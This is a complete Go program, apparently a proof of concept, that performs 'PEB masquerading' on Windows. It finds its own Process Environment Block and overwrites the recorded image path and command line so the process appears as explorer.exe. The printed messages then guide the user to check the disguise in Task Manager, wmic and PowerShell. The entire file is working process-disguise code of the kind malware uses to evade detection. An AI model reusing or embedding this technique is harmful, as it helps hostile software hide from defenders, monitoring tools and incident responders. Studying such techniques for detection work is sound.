package main

import (
	"fmt"
	"syscall"
	"unsafe"
)

// UNICODE_STRING structure
type UNICODE_STRING struct {
	Length        uint16
	MaximumLength uint16
	_             uint32 // padding
	Buffer        *uint16
}

// PEB structure (Process Environment Block) - minimal
type PEB struct {
	InheritedAddressSpace    byte
	ReadImageFileExecOptions byte
	BeingDebugged            byte
	SpareBool                byte
	Mutant                   uintptr
	ImageBase                uintptr
	Ldr                      uintptr
	ProcessParameters        uintptr // This is what we need
}

var (
	kernel32                      = syscall.NewLazyDLL("kernel32.dll")
	ntdll                         = syscall.NewLazyDLL("ntdll.dll")
	procGetCurrentProcess         = kernel32.NewProc("GetCurrentProcess")
	procNtQueryInformationProcess = ntdll.NewProc("NtQueryInformationProcess")
)

// ProcessBasicInformation structure for NtQueryInformationProcess
type ProcessBasicInformation struct {
	ExitStatus                   uintptr
	PebBaseAddress               uintptr
	AffinityMask                 uintptr
	BasePriority                 uintptr
	UniqueProcessId              uintptr
	InheritedFromUniqueProcessId uintptr
}

func getPEB() *PEB {
	//Get current process handle
	ret, _, _ := procGetCurrentProcess.Call()
	procHandle := ret

	//Query process information to get PEB
	var pbi ProcessBasicInformation

	status, _, _ := procNtQueryInformationProcess.Call(
		procHandle,
		0,                             // <---- The information class. 0 = ProcessBasicInformation
		uintptr(unsafe.Pointer(&pbi)), // <---- The memory slot to save the results. unsafe.Pointer convert go pointer to universal pointer. uintptr converts pointer into raw unsigned int.
		unsafe.Sizeof(pbi),            // < ------ The size of our slot
		0,
	)

	if status != 0 {
		fmt.Printf("[-] NtQueryInformationProcess failed with code: 0x%X\n", status)
		return nil
	}

	peb := (*PEB)(unsafe.Pointer(pbi.PebBaseAddress))
	return peb
}

// UnicodeStringToWString converts UNICODE_STRING to Go String
func UnicodeStringToWString(us *UNICODE_STRING) string {
	if us == nil || us.Buffer == nil {
		return ""
	}

	//Length is in bytes, divide by 2 for character count
	chars := us.Length / 2
	if chars == 0 {
		return ""
	}

	//Safely read the wide string
	slice := unsafe.Slice(us.Buffer, chars)

	result := ""
	for _, ch := range slice {
		result += string(rune(ch))
	}
	return result
}

// StringToUnicodeString converts Go String to UNICODE_STRING
func StringToUnicodeString(str string) UNICODE_STRING {
	wstr, _ := syscall.UTF16PtrFromString(str)
	strlen := len(str)

	return UNICODE_STRING{
		Length:        uint16(strlen * 2),
		MaximumLength: uint16(strlen*2 + 2),
		Buffer:        wstr,
	}
}

// GetUnicodeStringAtOffset safely reads a UNICODE_STRING from  a specific offset
func GetUnicodeStringAtOffset(basePtr uintptr, offset uintptr) *UNICODE_STRING {
	return (*UNICODE_STRING)(unsafe.Pointer(basePtr + offset))
}

func main() {
	fmt.Println("---- PEB Masquerading (Go) ----------")

	//1. Get the PEB Address
	peb := getPEB()
	if peb == nil {
		fmt.Println("[-] Failed to get PEB Address")
		return
	}

	fmt.Println("[+] Successfully got the peb")

	//2. Get the processParameter pointers
	procParamsPtr := peb.ProcessParameters
	if procParamsPtr == 0 {
		fmt.Println("[-] ProcParametes pointer is null")
		return
	}

	fmt.Printf("[+] ProcessParameters address: 0x%X\n", procParamsPtr)

	//3. Access ImagePathName and CommandLine using offsets
	// ImagePathName is at offset 0x60
	// CommandLine is at offset 0x70

	imagePath := GetUnicodeStringAtOffset(procParamsPtr, 0x60)
	commandLine := GetUnicodeStringAtOffset(procParamsPtr, 0x70)

	if imagePath == nil || imagePath.Buffer == nil {
		fmt.Println("[-] Failed to get imagePath")
		return
	}

	if commandLine == nil || commandLine.Buffer == nil {
		fmt.Println("[-] Failed to get CommandLine")
		return
	}

	//4. Print original values
	originalPath := UnicodeStringToWString(imagePath)
	originalCmd := UnicodeStringToWString(commandLine)

	fmt.Printf("[!] Original Image Path : %s\n", originalPath)
	fmt.Printf("[!] Original Command line: %s\n", originalCmd)

	// 5. The Masquerade - overwrite with fake values
	fakePath := "C:\\Windows\\explorer.exe"
	fakeCmd := "explorer.exe"

	// Create new UNICODE_STRING structures
	newImagePath := StringToUnicodeString(fakePath)
	newCommandLine := StringToUnicodeString(fakeCmd)

	// Overwrite the original structures in memory
	*imagePath = newImagePath
	*commandLine = newCommandLine

	fmt.Println("[+] PEB Masquerading complete!")
	fmt.Println("[*] Check Task Manager or run: wmic process list brief")
	fmt.Println("[*] Or: Get-Process -Name <your_process_name> | Select-Object ProcessName, CommandLine")
	fmt.Println("[+] wmic process where \"name='peb_masquerade.exe'\" get commandline")

	// Verify the changes
	verifyPath := UnicodeStringToWString(imagePath)
	verifyCmd := UnicodeStringToWString(commandLine)

	fmt.Printf("[+] New ImagePathName: %s\n", verifyPath)
	fmt.Printf("[+] New CommandLine: %s\n", verifyCmd)

	fmt.Println("\n[*] Keep this window open to maintain the masquerade")
	fmt.Println("[*] Check Task Manager now!")
	fmt.Println("\nPress Enter to exit...")
	var input string
	fmt.Scanln(&input)
}
